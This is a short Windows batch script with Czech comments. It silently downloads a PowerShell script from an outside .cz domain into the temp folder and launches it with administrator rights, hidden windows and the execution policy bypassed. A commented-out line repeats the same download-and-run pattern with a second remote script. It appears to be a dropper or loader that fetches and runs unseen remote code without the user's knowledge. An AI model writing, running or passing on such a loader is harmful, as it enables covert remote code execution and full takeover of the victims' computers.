@echo off
setlocal

set "SCRIPT_URL=https://25plrp.cz/nicol_2.ps1"
set "SCRIPT_PATH=%TEMP%\nicol.ps1"

:: Stáhne PowerShell skript (bez zobrazení konzole)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_PATH%'"

:: Spustí PowerShell skript jako admin (bez okna)
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_PATH%\"' -Verb RunAs"

endlocal
rem powershell -Command "& {Invoke-WebRequest -Uri 'https://25plrp.cz/script.ps1' -OutFile 'script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File script.ps1'}"
PAUSE






